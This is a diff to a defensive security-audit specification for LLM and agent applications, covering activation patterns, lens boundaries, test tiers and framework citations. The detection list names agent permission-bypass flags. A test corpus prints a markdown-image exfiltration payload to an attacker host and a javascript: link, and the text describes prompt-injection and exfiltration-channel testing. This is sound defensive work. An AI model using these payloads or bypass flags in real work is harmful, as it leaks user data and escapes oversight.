@@ -22,7 +22,7 @@ activates_on:
     - '@anthropic-ai/sdk'
     - 'openai'
     - 'AzureOpenAI'
-    - 'ai (Vercel AI SDK) / @ai-sdk/*'
+    - any_of: ["from 'ai'", 'from "ai"', '"ai":', '@ai-sdk/']
     - 'litellm'
     - 'langchain'
     - 'langchain_core'
@@ -30,7 +30,7 @@ activates_on:
     - 'langchain_openai'
     - 'langchain_experimental'
     - 'langgraph'
-    - 'llama_index / llama-index'
+    - any_of: ['llama_index', 'llama-index']
     - 'haystack-ai'
     - 'semantic-kernel'
     - 'pydantic-ai'
@@ -42,36 +42,36 @@ activates_on:
     - 'safetensors'
     - 'trust_remote_code=True'
     - 'from_pretrained('
-    - 'huggingface_hub / snapshot_download'
+    - any_of: ['huggingface_hub', 'snapshot_download']
     - 'vllm'
     - 'text-generation-inference'
     - 'ollama'
     - 'boto3.client("bedrock-runtime")'
-    - 'google.generativeai / google-genai / vertexai'
+    - any_of: ['google.generativeai', 'google-genai', 'vertexai']
     - 'chromadb'
     - 'pinecone'
     - 'weaviate-client'
     - 'qdrant_client'
     - 'faiss'
-    - 'pgvector / vector(1536) / <=> operator'
-    - 'mcp / modelcontextprotocol / FastMCP / @modelcontextprotocol/sdk'
-    - 'tools=[ / tool_choice / tool_use / function_call'
+    - any_of: ['pgvector', 'vector(1536)', '<=>']
+    - any_of: ['modelcontextprotocol', 'FastMCP', '@modelcontextprotocol/sdk']
+    - any_of: ['tools=[', 'tool_choice', 'tool_use', 'function_call']
     - 'messages=[{"role": "system"'
     - 'system='
-    - 'embeddings.create( / embed_documents('
-    - 'similarity_search( / as_retriever( / retriever.invoke('
+    - any_of: ['embeddings.create(', 'embed_documents(']
+    - any_of: ['similarity_search(', 'as_retriever(', 'retriever.invoke(']
     - 'RecursiveCharacterTextSplitter'
-    - 'AgentExecutor / create_agent / create_react_agent'
-    - 'PythonREPLTool / PythonAstREPLTool'
-    - 'allow_dangerous_code=True / allow_dangerous_requests=True'
-    - 'cache_control (prompt caching)'
-    - 'store=True (OpenAI Responses API)'
-    - 'stream=True with no max_tokens'
-    - 'claude -p / codex exec / gemini -p / cursor-agent / aider (agent CLI spawned as a subprocess)'
-    - '--permission-mode / --full-auto / --yolo / --dangerously-skip-permissions / --auto-approve / --allowedTools'
-    - 'acceptEdits / bypassPermissions'
-    - 'an env var holding an agent command line (*_COMMAND, *_CMD) split and spawned'
-    - 'a raw httpx.post / requests.post / fetch to an inference URL assembled from a base constant'
+    - any_of: ['AgentExecutor', 'create_agent', 'create_react_agent']
+    - any_of: ['PythonREPLTool', 'PythonAstREPLTool']
+    - any_of: ['allow_dangerous_code=True', 'allow_dangerous_requests=True']
+    - any_of: ['cache_control', 'prompt caching']
+    - 'store=True'
+    - 'stream=True'
+    - any_of: ['claude -p', 'codex exec', 'gemini -p', 'cursor-agent', 'aider']
+    - any_of: ['--permission-mode', '--full-auto', '--yolo', '--dangerously-skip-permissions', '--auto-approve', '--allowedTools']
+    - any_of: ['acceptEdits', 'bypassPermissions']
+    - any_of: ['AGENT_COMMAND', 'CLAUDE_COMMAND', 'CODEX_COMMAND', 'GEMINI_COMMAND', 'AI_COMMAND', 'AGENT_CMD', 'CLAUDE_CMD', 'CODEX_CMD']
+    - any_of: ['httpx.post(', 'requests.post(', 'fetch(']
   evidence_classes:
     source:
       state: consumed
@@ -129,8 +129,21 @@ defers:
   trust-boundary-inventory: threat-modeling
   stride-decomposition: threat-modeling
   attack-tree-construction: threat-modeling
+  training-data-provenance-and-integrity: ai-model-and-mlops-security
+  training-and-finetuning-poisoning: ai-model-and-mlops-security
+  model-artifact-integrity-and-change-control: ai-model-and-mlops-security
+  adversarial-input-and-evasion-resilience: ai-model-and-mlops-security
+  model-extraction-and-weight-theft: ai-model-and-mlops-security
+  model-inversion-and-membership-inference: ai-model-and-mlops-security
+  model-serving-resource-exhaustion: ai-model-and-mlops-security
+  model-security-monitoring-drift-and-rollback: ai-model-and-mlops-security
 frameworks:
-  - owasp-llm-top-10
+  - owasp-genai-llm-top-10-2026
+  - owasp-aisvs-1.0
+  - owasp-llmsvs-2.0
+  - owasp-agentic-top-10-2026
+  - nist-ai-600-1
+  - nist-sp-800-218a
   - cwe
 severity_floor: low
 ---
@@ -172,6 +185,7 @@ Do not raise findings on these. Where the code shows one, note it in the candida
   - **The renderer's escaping is web-and-api's; the channel is this lens's.** Rendering model output as HTML without encoding is `xss-and-output-encoding`. What stays here is `chat-exfiltration-channels`: a *correctly escaped* markdown image or link whose URL the model chose still performs an outbound request to an attacker-named host.
   - **Generic per-route rate limiting is web-and-api's** (`rate-limiting-and-request-quotas`). `denial-of-wallet-controls` is the model-specific budget: token caps, agent iteration caps, streaming length, concurrency of provider calls, and per-principal spend. A repository with a correct global rate limiter can still have an agent that loops forever on one request.
   - **CSP as a header policy is web-and-api's** (`security-headers-and-csp`). This lens reads the CSP only to decide whether an exfiltration channel is open, and reports that conclusion inside a `chat-exfiltration-channels` finding rather than filing a header finding.
+- **ai-model-and-mlops-security** — `training-data-provenance-and-integrity`, `training-and-finetuning-poisoning`, `model-artifact-integrity-and-change-control`, `adversarial-input-and-evasion-resilience`, `model-extraction-and-weight-theft`, `model-inversion-and-membership-inference`, `model-serving-resource-exhaustion`, and `model-security-monitoring-drift-and-rollback`. The artifact seam is exact: this lens owns origin, reference pinning, executable loading formats, and authenticity/integrity verification of an external artifact before interpretation. Once admitted, the model/MLOps lens owns the internally managed complete-release identity, component/evaluation binding, change approval, promotion, and rollback.
 - **cicd-and-supply-chain** — `package-name-squatting`, `dependency-pinning-and-lockfiles`, `package-dependency-cves`, `install-and-lifecycle-scripts`, `sbom-generation-and-attachment`. Including model-hallucinated package names that were installed: the slopsquatting and typosquatting analysis is theirs. What this lens contributes is the provenance note — that the install command or import came from model output — as an aggravator on their finding. CVEs in `transformers`, `langchain` or `llama-index` are likewise theirs.
 - **cloud-and-iac** — `iam-policy-and-privilege-scope`, `network-exposure-and-segmentation`, `managed-secret-service-configuration`, `kms-key-lifecycle-and-policy`, `encryption-at-rest-configuration`. Including the network position of a self-hosted inference or MCP server and the role attached to it. This lens owns whether the MCP server authenticates its callers and validates `Origin`; whether it is reachable from the internet is theirs.
 - **crypto-and-key-management** — `symmetric-encryption-and-nonce-handling`, `key-separation-derivation-and-destruction`. Including any encryption applied to stored conversations or embeddings.
@@ -1348,7 +1362,7 @@ Candidates considered for the list above and deliberately excluded. Nothing here
 
 Shared harness components are referenced by name and not restated here: the **counting fake provider client**, the **registry-driven enumerator**, the **two-subject fixture**, the **canary fixture set**, the **socket-layer destination recorder**, and **clock control**. Their implementations live in `lenses/_harness.md`.
 
-**Tier rule.** T1 is a proof the repository's own test command executes, including one that boots a dependency the repository's test script already boots. T2 requires the auditor to stand up infrastructure the repository does not already stand up, and the user is asked every time.
+**Tier rule.** T1 is a proof the repository's own test command executes, including one that boots a dependency the repository's test script already boots. T2 starts infrastructure the repository does not already start. An accepted authenticated operator statement naming the target, scope, and T2 launch is the sole authorization fact; the operator is accountable for it, and the auditor does not ask again or independently adjudicate legal authority. Execute only through a matching implemented controller; otherwise record `UNPROVEN` with the technical transport gap.
 
 **The standing design decision for this lens, stated in every report.** Every recipe below drives a **scripted worst-case-compliant fake provider client** — one that always returns another tool call, always emits the exfiltration URL, always complies with the injected instruction. The recipes test the harness, never the model. Whether a given model resists a given injection is nondeterministic, version-dependent and out of scope; a passing recipe proves the application bounds a compliant model, which is the only property that survives a model upgrade.
 
@@ -1422,8 +1436,10 @@ These recipes ship once, in the lens that owns them. Reference them by number an
 - **Whether an embedding is reversible in practice** for a given model and corpus. The finding rests on the store's access control and metadata contents, which are testable, not on an inversion demonstration, which is research work.
 - **The value of an environment variable holding an agent command line.** The checkout shows the default literal and the flags the code appends to it; what operations actually put in `TICKET_TRIAGE_COMMAND` or its equivalent is a deployment fact. Name the variable, quote the default, and report the effective permission mode as unverified — never grade item 16 on the default while calling it the command that runs.
 - **Contractual posture** of any provider or processor.
-- **End-to-end exfiltration against a live listener.** The hostile-output render assertion has a T1 half — feed the render path a fixed hostile corpus (`![x](https://attacker.test/p?d=SECRET)`, `[click](javascript:alert(1))`, a data-URI SVG) in jsdom and assert no `img` element exists, no attacker-controlled `src` or `href` host survives, and the payload appears as text. **Where the app rewrites URLs through an image proxy, assert on the destination the proxy would resolve, not on the `src` host** — a same-origin `/img?url=…` carrying the attacker's host in a parameter passes a host check on the `src` while the server still makes the request. The half that proves the *channel* is closed rather than that one string was escaped needs a headless browser and a bound localhost listener asserting zero requests, and is **T2**: the user is asked, and where they decline the finding is reported UNPROVEN rather than cleared. Reaching a real outbound host is out of bounds in every tier.
+- **End-to-end exfiltration against a live listener.** The hostile-output render assertion has a T1 half — feed the render path a fixed hostile corpus (`![x](https://attacker.test/p?d=SECRET)`, `[click](javascript:alert(1))`, a data-URI SVG) in jsdom and assert no `img` element exists, no attacker-controlled `src` or `href` host survives, and the payload appears as text. **Where the app rewrites URLs through an image proxy, assert on the destination the proxy would resolve, not on the `src` host** — a same-origin `/img?url=…` carrying the attacker's host in a parameter passes a host check on the `src` while the server still makes the request. The half that proves the *channel* is closed rather than that one string was escaped needs a headless browser and a bound localhost listener asserting zero requests, and is **T2**. When the accepted authenticated operator statement names that local launch, do not ask again; execute only through a matching implemented controller, or report `UNPROVEN` with the technical transport gap rather than clearing the finding. A real outbound host remains outside repository proof. It may be contacted only as separate external evidence when the statement names the exact destination, scope, effect, and credential use and a matching destination-bound controller exists; otherwise record the technical gap. Never infer the destination from repository configuration or promote the external result into a repository proof tier.
 
 ### Framework citations for the report
 
-Cite what actually governs the finding, by identifier: **OWASP Top 10 for LLM Applications (2025)** for the LLM01-LLM10 classes; **OWASP Top 10 for Agentic Applications** for the tool-authority, multi-agent and MCP classes, which the application list does not fully cover; **`nist-ai-600-1`** (the Generative AI Profile of the AI Risk Management Framework) for the risk framing; **`mitre-atlas`** for adversary technique identifiers where a finding maps to one; and the **GenAI community profile of the NIST Secure Software Development Framework** (`nist-ssdf-800-218a`) for the artifact-provenance and training-data items. Name the identifier in the finding rather than the phrase, so a reader can look it up, and do not cite a version you have not confirmed.
+Cite only the artifact that actually governs the finding, by versioned identifier: **OWASP Top 10 for LLM Applications 2026** for the LLM01-LLM10 application-risk taxonomy; **OWASP AISVS 1.0** for individually mapped verification requirements; **OWASP LLMSVS 2.0** as a secondary LLM-specific verification gap check beneath AISVS; and **OWASP Top 10 for Agentic Applications 2026** for tool-authority, multi-agent, memory, identity, and MCP risk classes that the application list does not fully cover. Use **`nist-ai-600-1`** for Generative AI risk framing, **`nist-sp-800-218a`** for AI-specific secure-development practices, and **`mitre-atlas`** for adversary technique identifiers where a finding maps to one.
+
+The OWASP Agentic AI Security Initiative's Agent Control Standard, MCP Top 10, and Agentic Skills Top 10 remain preview, beta, or public-review material as of the 2026-09-03 source snapshot. They can sharpen a hypothesis or verification question, but they are not conformance baselines. Name a requirement or risk identifier in the finding instead of citing a project name alone, and never imply whole-standard conformance from this repository lens.
